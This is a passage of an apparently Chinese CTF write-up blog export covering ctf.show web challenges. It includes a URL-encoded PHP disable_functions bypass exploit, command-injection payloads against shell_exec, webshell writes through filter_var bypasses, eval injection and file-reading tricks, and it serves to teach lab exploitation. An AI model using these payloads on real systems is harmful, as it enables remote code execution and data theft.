(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403171847531.png" alt="image-20220403171847531"></p><h1 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h1><pre><code>查位置c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);payloadc=include(&quot;/flagc.txt&quot;);exit(0);c=require(&quot;/flagc.txt&quot;);exit(0);c=require_once(&quot;/flagc.txt&quot;);exit(0);</code></pre><h1 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h1><h2 id="利用mysql-load-file读取文件"><a href="#利用mysql-load-file读取文件" class="headerlink" title="利用mysql load_file读取文件"></a>利用mysql load_file读取文件</h2><pre><code>查位置c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</code></pre><p>利用mysql load_file读取文件,但是用户名密码怎么知道的?</p><h1 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h1><pre><code>位置c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36d.txt&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</code></pre><h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><pre><code>位置c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$a=&#39;/readflag &gt; 1.txt&#39;;$ffi-&gt;system($a);接着访问1.txt</code></pre><h1 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h1><h2 id="环境变量构造nl命令"><a href="#环境变量构造nl命令" class="headerlink" title="环境变量构造nl命令"></a>环境变量构造nl命令</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403181813720.png" alt="image-20220403181813720"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403181913365.png" alt="image-20220403181913365"></p><p>fuzz一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403184156712.png"></p><p>发现只有大写A-Z和${}~.?:</p><pre><code>Linuxecho $&#123;PWD&#125;            #/rootecho $&#123;PWD:0:1&#125;        #/    表示从0下标开始的第一个字符echo $&#123;PWD:~0:1&#125;    #t    表示从结尾开始往前的第一个字符echo $&#123;PWD:~0&#125;        #t    echo $&#123;PWD:~A&#125;        #t    字母和0具有同样作用echo $&#123;PWD:~A&#125;        #/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code></pre><p>利用环境变量构造nl命令</p><pre><code>$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???$&#123;PATH:~A&#125;-&gt;n$&#123;PWD:~A&#125;-&gt;l$IFS    空格</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403184225406.png" alt="image-20220403184225406"></p><p>&#96;&#96;&#96;<br>SHLVL是记录多个Bash进程实例嵌套深度的累加器,进程第一次打开shell时,${SHLVL}&#x3D;1,然后在此shell中在打开一个shell是${SELVL}&#x3D;2<br>${PWD:$是0<br>${SHLVL}是1<br>$:$:$</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/ctfshow/ctf.show/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/ctfshow/ctf.show/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><pre><code>__sleep() //执行serialize()时，先会调用这个函数__wakeup() //将在反序列化之后立即调用（当反序列化时变量个数与实际不符时绕过）__construct() //当对象被创建时，会触发进行初始化__destruct() //对象被销毁时触发__toString()： //当一个对象被当作字符串使用时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //获得一个类的成员变量时调用,用于从不可访问的属性读取数据（不可访问的属性包括：1.属性是私有型。2.类中不存在的成员变量）__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当尝试以调用函数的方式调用一个对象时</code></pre><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-12-02 17:44:47  Last Modified by:   h1xa  Last Modified time: 2020-12-02 19:29:02  email: h1xa@ctfer.com  link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&#39;flag.php&#39;);class ctfShowUser&#123;    public $username=&#39;xxxxxx&#39;;    public $password=&#39;xxxxxx&#39;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p)&#123;            $this-&gt;isVip=true;        &#125;        return $this-&gt;isVip;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            echo &quot;your flag is &quot;.$flag;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = new ctfShowUser();    if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;</code></pre><p>这题连序列化,反序列化函数都没有,直接get传参</p><pre><code>?username=xxxxxx&amp;password=xxxxxx</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271212027.png" alt="image-20220327121200946"></p><h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><p>&#96;&#96;&#96;php<br>&lt;?php</p><p>&#x2F;*</p><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>  Author: h1xa<br>  Date:   2020-12-02 17:44:47<br>  Last Modified by:   h1xa<br>  Last Modified time: 2020-12-02 19:29:02<br>  email: <a href="mailto:&#104;&#x31;&#x78;&#x61;&#64;&#99;&#116;&#x66;&#101;&#114;&#46;&#99;&#111;&#x6d;">&#104;&#x31;&#x78;&#x61;&#64;&#99;&#116;&#x66;&#101;&#114;&#46;&#99;&#111;&#x6d;</a><br>  link: <a href="https://ctfer.com/">https://ctfer.com</a></p><p>*&#x2F;</p><p>error_reporting(0);<br>highlight_file(<strong>FILE</strong>);<br>include(‘flag.php’);</p><p>class ctfShowUser{<br>    public $username&#x3D;’xxxxxx’;<br>    public $password&#x3D;’xxxxxx’;<br>    public $isVip&#x3D;false;</p><pre><code>public function checkVip()&#123;    return $this-&gt;isVip;&#125;public function login($u,$p)&#123;    return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;&#125;public function vipOneKeyGetFlag()&#123;    if($this-&gt;isVip)&#123;        global $flag;        echo &quot;your flag is &quot;.$flag;    &#125;else&#123;        echo &quot;no vip, no flag&quot;;    &#125;&#125;</code></pre><p>}</p><p>$username&#x3D;$_GET[‘username’];<br>$password&#x3D;$_GET[‘password’];</p><p>if(isset($username) &amp;&amp; isset($password))</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>其他</title>
      <link href="/ctfshow/ctf.show/%E5%85%B6%E4%BB%96/"/>
      <url>/ctfshow/ctf.show/%E5%85%B6%E4%BB%96/</url>
      
        <content type="html"><![CDATA[<h1 id="web396"><a href="#web396" class="headerlink" title="web396"></a>web396</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-15 16:38:07 Last Modified by:   h1xa Last Modified time: 2021-01-15 17:20:22 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#39;url&#39;]))&#123;    $url = parse_url($_GET[&#39;url&#39;]);#解析一个url返回关联数组    shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; &#39;.$url[&#39;path&#39;]);#通过shell环境执行命令,并将完整的输出以字符串形式返回 host www.baidu.com path /test/&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>简单测试一下发现,通过;可以让shell的命令进行分开执行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291943011.png" alt="image-20220329194307970"></p><pre><code>?url=http://1/1; echo `ls` &gt; 1.txt</code></pre><p>接着访问1.txt文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291945703.png" alt="image-20220329194559670"></p><pre><code>?url=http://www/qqq;cat fl0g.php &gt; 2.txt</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291953344.png" alt="image-20220329195341272"></p><pre><code>?url=http://www/qqq;tac `ls`&gt; 3.txt</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291953960.png" alt="image-20220329195357904"></p><h1 id="web397"><a href="#web397" class="headerlink" title="web397"></a>web397</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-15 16:38:07 Last Modified by:   h1xa Last Modified time: 2021-01-15 17:49:13 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#39;url&#39;]))&#123;    $url = parse_url($_GET[&#39;url&#39;]);    shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; /tmp/&#39;.$url[&#39;path&#39;]);&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>有一个&#x2F;tmp&#x2F;目录</p><pre><code>?url=http://1/1; echo `ls`/../ &gt; 1.txt</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312033319.png" alt="image-20220331203325243"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312033697.png" alt="image-20220331203335633"></p><pre><code>?url=http://www/qqq;cat fl0g.php &gt; 2.txt</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312035864.png" alt="image-20220331203522793"></p><h1 id="web398"><a href="#web398" class="headerlink" title="web398"></a>web398</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-15 16:38:07 Last Modified by:   h1xa Last Modified time: 2021-01-15 18:00:42 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#39;url&#39;]))&#123;    $url = parse_url($_GET[&#39;url&#39;]);    if(!preg_match(&#39;/;/&#39;, $url[&#39;host&#39;]))&#123;        shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; /tmp/&#39;.$url[&#39;path&#39;]);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><pre><code class="php">?url=http://1/1;echo `ls`&gt;a.txt?url=http://1/1;echo `cat fl0g.php`&gt;a.txt</code></pre><h1 id="web399"><a href="#web399" class="headerlink" title="web399"></a>web399</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-15 16:38:07 Last Modified by:   h1xa Last Modified time: 2021-01-15 18:04:27 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#39;url&#39;]))&#123;    $url = parse_url($_GET[&#39;url&#39;]);    if(!preg_match(&#39;/;|&gt;/&#39;, $url[&#39;host&#39;]))&#123;        shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; /tmp/&#39;.$url[&#39;path&#39;]);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><pre><code class="php">?url=http://1/1;echo `ls`&gt;a.txt?url=http://1/1;echo `cat fl0g.php`&gt;a.txt</code></pre><h1 id="web400"><a href="#web400" class="headerlink" title="web400"></a>web400</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-15 16:38:07 Last Modified by:   h1xa Last Modified time: 2021-01-15 18:13:14 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#39;url&#39;]))&#123;    $url = parse_url($_GET[&#39;url&#39;]);    if(!preg_match(&#39;/;|&gt;|http|https/i&#39;, $url[&#39;host&#39;]))&#123;        shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; /tmp/&#39;.$url[&#39;path&#39;]);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><pre><code class="php">?url=http://1/1;echo `ls`&gt;a.txt?url=http://1/1;echo `cat fl0g.php`&gt;a.txt</code></pre><h1 id="web401"><a href="#web401" class="headerlink" title="web401"></a>web401</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-15 16:38:07 Last Modified by:   h1xa Last Modified time: 2021-01-15 18:16:48 email: h1xa@ctfer.com link: https://ctfer.com*/#error_reporting(0);if(isset($_GET[&#39;url&#39;]))&#123;    $url = parse_url($_GET[&#39;url&#39;]);    var_dump($url);    if(!preg_match(&#39;/;|&gt;|http|https|\|/i&#39;, $url[&#39;host&#39;]))&#123;        shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; /tmp/&#39;.$url[&#39;path&#39;]);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><pre><code class="php">?url=http://1/1;echo `ls`&gt;a.txt?url=http://1/1;echo `cat fl0g.php`&gt;a.txt</code></pre><h1 id="web402"><a href="#web402" class="headerlink" title="web402"></a>web402</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-15 16:38:07 Last Modified by:   h1xa Last Modified time: 2021-01-15 18:35:41 email: h1xa@ctfer.com link: https://ctfer.com*/#error_reporting(0);if(isset($_GET[&#39;url&#39;]))&#123;    $url = parse_url($_GET[&#39;url&#39;]);    var_dump($url);    if(preg_match(&#39;/http|https/i&#39;, $url[&#39;scheme&#39;]))&#123;        die(&#39;error&#39;);    &#125;    if(!preg_match(&#39;/;|&gt;|\||base/i&#39;, $url[&#39;host&#39;]))&#123;        shell_exec(&#39;echo &#39;.$url[&#39;host&#39;].&#39;&gt; /tmp/&#39;.$url[&#39;path&#39;]);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><pre><code class="php">?url=file://1/1;echo `ls`&gt;a.txt?url=file://1/1;echo `cat fl0g.php`&gt;a.txt</code></pre><h1 id="web403"><a href="#web403" class="headerlink" title="web403"></a>web403</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-15 16:38:07 Last Modified by:   h1xa Last Modified time: 2021-01-15 18:44:06 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#39;url&#39;]))&#123;    $url = parse_url($_GET[&#39;url&#39;]);    if(preg_match(&#39;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#39;, $url[&#39;host&#39;]))&#123;        shell_exec(&#39;curl &#39;.$url[&#39;scheme&#39;].$url[&#39;host&#39;].$url[&#39;path&#39;]);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><pre><code class="php">?url=http://127.0.0.1/1;echo `cat fl0g.php`&gt;a.txt</code></pre><h1 id="405"><a href="#405" class="headerlink" title="405"></a>405</h1><h1 id="web405"><a href="#web405" class="headerlink" title="web405"></a>web405</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-15 16:38:07 Last Modified by:   h1xa Last Modified time: 2021-01-15 19:20:10 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#39;url&#39;]))&#123;    $url = parse_url($_GET[&#39;url&#39;]);    if(preg_match(&#39;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#39;, $url[&#39;host&#39;]))&#123;        if(preg_match(&#39;/^\/[A-Za-z0-9]+$/&#39;, $url[&#39;path&#39;]))&#123;            if(preg_match(&#39;/\~|\.|php/&#39;, $url[&#39;scheme&#39;]))&#123;                shell_exec(&#39;curl &#39;.$url[&#39;scheme&#39;].$url[&#39;host&#39;].$url[&#39;path&#39;]);            &#125;                    &#125;    &#125;&#125;else&#123;    highlight_file(__FILE__);    echo &#39;parse_url 好强大&#39;;&#125;parse_url 好强大</code></pre><pre><code class="php">?url=httphp://127.0.0.1111;echo `cat f*`&gt;1.txt;11/a</code></pre><h1 id="web406"><a href="#web406" class="headerlink" title="web406"></a>web406</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-16 14:58:50 Last Modified by:   h1xa Last Modified time: 2021-01-16 16:00:51 email: h1xa@ctfer.com link: https://ctfer.com*/require &#39;config.php&#39;;//flag in dbhighlight_file(__FILE__);$url=$_GET[&#39;url&#39;];if(filter_var ($url,FILTER_VALIDATE_URL))&#123;    $sql = &quot;select * from links where url =&#39;&#123;$url&#125;&#39;&quot;;    $result = $conn-&gt;query($sql);&#125;else&#123;    echo &#39;不通过&#39;;&#125;Notice: Undefined index: url in /var/www/html/index.php on line 17不通过</code></pre><p><a href="https://www.cnblogs.com/lxfweb/p/13757525.html">PHP代码审计02之filter_var()函数缺陷</a></p><h1 id="web407"><a href="#web407" class="headerlink" title="web407"></a>web407</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-16 14:58:50 Last Modified by:   h1xa Last Modified time: 2021-01-16 17:24:13 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);error_reporting(0);$ip=$_GET[&#39;ip&#39;];if(filter_var ($ip,FILTER_VALIDATE_IP))&#123;    call_user_func($ip);&#125;class cafe&#123;    public static function add()&#123;        echo file_get_contents(&#39;flag.php&#39;);    &#125;&#125;</code></pre><p>IPv6的128位地址通常写成8组，每组为四个十六进制数的形式。比如：AD80:0000:0000:0000:ABAA:0000:00C2:0002  是一个合法的IPv6地址。这个地址比较长，看起来不方便也不易于书写。零压缩法可以用来缩减其长度。如果几个连续段位的值都是0，那么这些0就可以简单的以::来表示</p><p>被认为是ipv6地址</p><pre><code class="php">?ip=cafe::add</code></pre><h1 id="web408"><a href="#web408" class="headerlink" title="web408"></a>web408</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-16 14:58:50 Last Modified by:   h1xa Last Modified time: 2021-01-16 19:53:18 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);error_reporting(0);$email=$_GET[&#39;email&#39;];if(filter_var ($email,FILTER_VALIDATE_EMAIL))&#123;    file_put_contents(explode(&#39;@&#39;, $email)[1], explode(&#39;@&#39;, $email)[0]);&#125;</code></pre><pre><code class="php">email=&quot;&lt;?=system($_POST[1]);?&gt;&quot;@123.php</code></pre><p>非法字符可以放在双引号里面绕过检测</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415130131892.png" alt="image-20220415130131892"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415130222833.png" alt="image-20220415130222833"></p><h1 id="web409"><a href="#web409" class="headerlink" title="web409"></a>web409</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-16 14:58:50 Last Modified by:   h1xa Last Modified time: 2021-01-16 20:26:16 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);error_reporting(0);$email=$_GET[&#39;email&#39;];if(filter_var ($email,FILTER_VALIDATE_EMAIL))&#123;    $email=preg_replace(&#39;/.flag/&#39;, &#39;&#39;, $email);    eval($email);&#125;</code></pre><p>@后面是不符合php语句格式的字符尝试闭合网页当中前面的&lt;?php</p><p>可行但是发现前面的”也是非法的<br>题目有个替换为.flag也就是把flag和它前面那个字符替换为空，这就可以把emai当中前面双引号这个非法字符给替换掉，避免在php环境里面出错</p><pre><code class="php">?email=&quot;flagsystem($_POST[1]);?&gt;&quot;@123.comPOST1=cat /flag</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415130816722.png" alt="image-20220415130816722"></p><h1 id="web410"><a href="#web410" class="headerlink" title="web410"></a>web410</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-25 23:07:21 Last Modified by:   h1xa Last Modified time: 2021-01-26 13:12:41 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);error_reporting(0);include(&#39;flag.php&#39;);$b=$_GET[&#39;b&#39;];if(filter_var ($b,FILTER_VALIDATE_BOOLEAN))&#123;    if($b==&#39;true&#39; || intval($b)&gt;0)&#123;        die(&#39;FLAG NOT HERE&#39;);    &#125;else&#123;        echo $flag;    &#125;&#125;</code></pre><pre><code class="php">定义和用法FILTER_VALIDATE_BOOLEAN 过滤器把值作为布尔选项来验证。Name: &quot;boolean&quot;ID-number: 258可能的返回值：如果是 &quot;1&quot;, &quot;true&quot;, &quot;on&quot; 以及 &quot;yes&quot;，则返回 true。如果是 &quot;0&quot;, &quot;false&quot;, &quot;off&quot;, &quot;no&quot; 以及 &quot;&quot;，则返回 false。否则返回 NULL。</code></pre><pre><code class="php">?b=yes</code></pre><h1 id="web411"><a href="#web411" class="headerlink" title="web411"></a>web411</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-25 23:07:21 Last Modified by:   h1xa Last Modified time: 2021-01-26 13:12:41 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);error_reporting(0);include(&#39;flag.php&#39;);$b=$_GET[&#39;b&#39;];if(filter_var ($b,FILTER_VALIDATE_BOOLEAN))&#123;    if($b==&#39;true&#39; || intval($b)&gt;0 ||$b==&#39;on&#39; || $b==&#39;ON&#39;)&#123;        die(&#39;FLAG NOT HERE&#39;);    &#125;else&#123;        echo $flag;    &#125;&#125;</code></pre><pre><code class="php">?b=yes</code></pre><h1 id="web412"><a href="#web412" class="headerlink" title="web412"></a>web412</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-25 23:07:21 Last Modified by:   h1xa Last Modified time: 2021-01-26 16:19:28 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);$ctfshow=$_POST[&#39;ctfshow&#39;];if(isset($ctfshow))&#123;    file_put_contents(&#39;flag.php&#39;, &#39;//&#39;.$ctfshow,FILE_APPEND);    include(&#39;flag.php&#39;);&#125;</code></pre><pre><code class="php">ctfshow=?&gt;&lt;?php eval($_POST[1]);&amp;1=system(&#39;cat flag.php&#39;);</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415132225921.png" alt="image-20220415132225921"></p><pre><code class="php">ctfshow=%0asystem(&#39;tac f*&#39;);</code></pre><h1 id="web413"><a href="#web413" class="headerlink" title="web413"></a>web413</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-25 23:07:21 Last Modified by:   h1xa Last Modified time: 2021-01-26 16:19:28 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);$ctfshow=$_POST[&#39;ctfshow&#39;];if(isset($ctfshow))&#123;        file_put_contents(&#39;flag.php&#39;, &#39;/*&#39;.$ctfshow.&#39;*/&#39;,FILE_APPEND);    include(&#39;flag.php&#39;);&#125;Notice: Undefined index: ctfshow in /var/www/html/index.php on line 16</code></pre><pre><code class="php">ctfshow=/eval($_POST[1]);/&amp;1=system(‘cat flag.php’);</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415133217378.png" alt="image-20220415133217378"></p><h1 id="web414"><a href="#web414" class="headerlink" title="web414"></a>web414</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-25 23:07:21 Last Modified by:   h1xa Last Modified time: 2021-01-26 16:43:53 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);include(&#39;flag.php&#39;);$ctfshow=$_GET[&#39;ctfshow&#39;];if($ctfshow==true)&#123;    if(sqrt($ctfshow)&gt;=sqrt(intval($flag)))&#123;        echo &#39;FLAG_NOT_HERE&#39;;    &#125;else&#123;        echo $flag;    &#125;&#125;Notice: Undefined index: ctfshow in /var/www/html/index.php on line 16</code></pre><pre><code class="平衡盘">?ctfshow=-1</code></pre><p>sqrt() 函数返回一个数的平方根。</p><p> 返回 number 的平方根，如果 number 是负数则返回 NAN。</p><h1 id="web415"><a href="#web415" class="headerlink" title="web415"></a>web415</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-25 23:07:21 Last Modified by:   h1xa Last Modified time: 2021-01-26 19:15:52 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);$k = $_GET[k];function getflag()&#123;    echo file_get_contents(&#39;flag.php&#39;);&#125;if($k==&#39;getflag&#39;)&#123;    die(&#39;FLAG_NOT_HERE&#39;);&#125;else&#123;    call_user_func($k);&#125;</code></pre><pre><code class="php">?k=getflaG</code></pre><h1 id="web416"><a href="#web416" class="headerlink" title="web416"></a>web416</h1><pre><code class="php"> &lt;?php/*# -*- coding: 